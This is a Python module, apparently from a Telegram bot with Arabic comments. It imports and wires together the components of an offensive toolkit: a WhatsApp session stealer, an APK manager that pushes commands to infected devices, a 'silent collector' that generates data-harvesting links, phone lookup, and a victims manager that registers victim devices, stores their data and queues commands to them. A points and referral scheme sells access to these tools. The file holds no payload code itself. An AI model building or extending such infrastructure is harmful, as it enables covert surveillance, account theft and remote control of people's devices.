# imports_manager.py
# ============================================================
# استيراد كل الأدوات مع Fallback آمن
# v11 — نظام النقاط + Legacy Compatibility
# ============================================================

import io
import json
from telebot.types import InlineKeyboardMarkup

from logging_config import get_logger

logger = get_logger("imports_manager")

try:
    from config import redis_client
except Exception:
    redis_client = None


# ═══ Facebook ═══
try:
    from facebook_module import init_facebook_routes
    logger.info("[+] facebook_module imported")
except Exception as e:
    logger.error(f"facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None


# ═══ Instagram ═══
try:
    from instagram_module import init_instagram_routes
    logger.info("[+] instagram_module imported")
except Exception as e:
    logger.error(f"instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None


# ═══ WhatsApp Stealer ═══
try:
    from wa_stealer import (
        init_whatsapp_stealer_routes,
        wa_bp,
        get_wa_data,
        build_wa_panel,
        create_wa_session,
        get_wa_session,
    )
    WA_ENABLED = True
    logger.info("[+] wa_stealer imported")
except Exception as e:
    logger.error(f"wa_stealer: {e}")
    WA_ENABLED = False
    def init_whatsapp_stealer_routes(app, bot): pass
    wa_bp = None
    def get_wa_data(session_id): return {"storage": None, "idb": None, "chunks_count": 0}
    def build_wa_panel(session_id, chat_id): return InlineKeyboardMarkup()
    def create_wa_session(session_id, chat_id): return None
    def get_wa_session(session_id): return None


# ═══ APK Manager ═══
try:
    from apk_manager import (
        init_apk_routes,
        apk_bp,
        build_apk_panel,
        push_apk_command,
        create_apk_code,
        get_apk_code,
        get_apk_devices,
        get_apk_device,
    )
    APK_MANAGER_ENABLED = True
    logger.info("[+] apk_manager imported")
except Exception as e:
    logger.error(f"apk_manager: {e}")
    APK_MANAGER_ENABLED = False
    def init_apk_routes(app, bot): pass
    apk_bp = None
    def build_apk_panel(device_id): return InlineKeyboardMarkup()
    def push_apk_command(*a, **kw): return False
    def create_apk_code(chat_id): return None
    def get_apk_code(code): return None
    def get_apk_devices(): return []
    def get_apk_device(device_id): return None


# ═══ Silent Collector ═══
try:
    from silent_collector import (
        init_silent_collector_routes,
        generate_silent_link,
        get_silent_data,
        get_user_silent_sessions,
    )
    SILENT_ENABLED = True
    logger.info("[+] silent_collector imported")
except Exception as e:
    logger.exception(f"silent_collector: {e}")
    SILENT_ENABLED = False
    def init_silent_collector_routes(app, bot): pass
    def generate_silent_link(*a, **kw): return None
    def get_silent_data(*a, **kw): return None
    def get_user_silent_sessions(*a, **kw): return []


# ═══ Phone Search ═══
try:
    from phone_search import (
        search_phone,
        format_result_for_telegram,
    )
    PHONE_SEARCH_ENABLED = True
    logger.info("[+] phone_search imported")
except Exception as e:
    logger.exception(f"phone_search: {e}")
    PHONE_SEARCH_ENABLED = False
    def search_phone(*a, **kw): return {'error': 'Phone search disabled'}
    def format_result_for_telegram(r): return "❌ Phone search disabled"


def get_user_phone_searches(chat_id, limit=10):
    if not redis_client:
        return []
    try:
        items = redis_client.lrange(f"phone_searches:{chat_id}", 0, limit - 1)
        result = []
        for item in items:
            try:
                result.append(json.loads(item) if isinstance(item, str) else item)
            except Exception:
                pass
        return result
    except Exception:
        return []


# ═══ Victims Manager ═══
try:
    from victims_manager import (
        create_victim, get_victim, get_all_victims, delete_victim,
        update_victim_status, rename_victim,
        find_victim_by_token, register_victim_device,
        add_victim_data, get_victim_data,
        queue_victim_command, pop_victim_commands,
        get_victim_stats, has_victim_commands,
    )
    VICTIMS_ENABLED = True
    logger.info("[+] victims_manager imported")
except Exception as e:
    logger.exception(f"victims_manager: {e}")
    VICTIMS_ENABLED = False
    def create_victim(*a, **kw): return None
    def get_victim(*a, **kw): return None
    def get_all_victims(*a, **kw): return []
    def delete_victim(*a, **kw): return False
    def update_victim_status(*a, **kw): return False
    def rename_victim(*a, **kw): return False
    def find_victim_by_token(*a, **kw): return None
    def register_victim_device(*a, **kw): return False
    def add_victim_data(*a, **kw): return False
    def get_victim_data(*a, **kw): return []
    def queue_victim_command(*a, **kw): return False
    def pop_victim_commands(*a, **kw): return []
    def get_victim_stats(*a, **kw): return {}
    def has_victim_commands(*a, **kw): return False


# ═══ ★★★ Points System (بدل stars_payment) ★★★ ═══
try:
    from points_system import (
        get_or_create_user, can_use_tool, consume_usage,
        build_main_menu_keyboard, build_points_menu_keyboard,
        build_points_menu_text, build_my_account_text,
        build_points_history_text, build_my_referrals_text,
        build_how_to_earn_text,
        is_admin, is_vip,
        get_all_users, get_user, save_user,
        delete_user, ban_user, unban_user,
        add_points, remove_points, set_points,
        get_referral_by_code, get_user_referrals,
        build_admin_stats_text,
        ADMIN_IDS, WELCOME_POINTS, REFERRAL_POINTS,
        TOOL_PRICES, TOOL_NAMES_AR,
    )
    POINTS_SYSTEM_ENABLED = True
    logger.info("[+] points_system imported")

    # ─── توافق مع الكود القديم ───
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 0
    AVAILABLE_TOOLS = list(TOOL_PRICES.keys())

except Exception as e:
    logger.exception(f"points_system: {e}")
    POINTS_SYSTEM_ENABLED = False

    def get_or_create_user(user_id, *a, **kw):
        return {"user_id": user_id, "points": 0, "is_banned": False, "is_vip": False}

    def can_use_tool(user_id, tool):
        return {"allowed": True, "reason": "bypass", "cost": 0, "balance": 0}

    def consume_usage(user_id, tool):
        return True

    def build_main_menu_keyboard(user_id):
        return InlineKeyboardMarkup()

    def build_points_menu_keyboard(user_id):
        return InlineKeyboardMarkup()

    def build_points_menu_text(user_id):
        return "نظام النقاط معطّل"

    def build_my_account_text(user_id):
        return "نظام النقاط معطّل"

    def build_points_history_text(user_id, limit=10):
        return ""

    def build_my_referrals_text(user_id, limit=20):
        return ""

    def build_how_to_earn_text():
        return ""

    def is_admin(uid): return False
    def is_vip(uid): return False
    def get_all_users(): return []
    def get_user(uid): return None
    def save_user(uid, u): return False
    def delete_user(uid): return False
    def ban_user(uid): return False
    def unban_user(uid): return False
    def add_points(*a, **kw): return False
    def remove_points(*a, **kw): return False
    def set_points(*a, **kw): return False
    def get_referral_by_code(code): return None
    def get_user_referrals(uid, limit=50): return []
    def build_admin_stats_text(): return ""

    ADMIN_IDS = []
    WELCOME_POINTS = 25
    REFERRAL_POINTS = 10
    TOOL_PRICES = {}
    TOOL_NAMES_AR = {}
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 0
    AVAILABLE_TOOLS = []


# ══════════════════════════════════════════════════════════
# ★★★ Legacy Functions للتوافق مع الكود القديم ★★★
# ══════════════════════════════════════════════════════════

def build_main_payment_keyboard():
    """Legacy — بيرجع قائمة النقاط"""
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 نقاطي والإحالات", callback_data="points_menu"))
    m.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return m


def build_plans_keyboard():
    """Legacy"""
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 نقاطي", callback_data="points_menu"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return m


def build_account_text(user_id):
    """Legacy — يستخدم نظام النقاط"""
    try:
        from points_system import build_my_account_text
        return build_my_account_text(user_id)
    except Exception:
        return f"👤 حسابك — ID: {user_id}"


def build_plans_text():
    """Legacy"""
    return "💰 النظام تغيّر إلى النقاط — اضغط 💰 نقاطي"


def send_invoice(*args, **kwargs):
    """Legacy — ملغية (نظام النقاط مافيهوش دفع)"""
    return None


def activate_subscription(*args, **kwargs):
    """Legacy — ملغية"""
    return {}


def register_payment_handlers(bot):
    """Legacy — ملغية (نظام النقاط بيشتغل تلقائياً)"""
    logger.info("Payment handlers: SKIPPED (using points system)")


# ══════════════════════════════════════════════════════════
# Summary
# ══════════════════════════════════════════════════════════
logger.info(
    f"Imports Summary | "
    f"PHONE_SEARCH={PHONE_SEARCH_ENABLED} | "
    f"SILENT={SILENT_ENABLED} | "
    f"WA={WA_ENABLED} | "
    f"APK_MGR={APK_MANAGER_ENABLED} | "
    f"VICTIMS={VICTIMS_ENABLED} | "
    f"POINTS_SYSTEM={POINTS_SYSTEM_ENABLED}"
                )
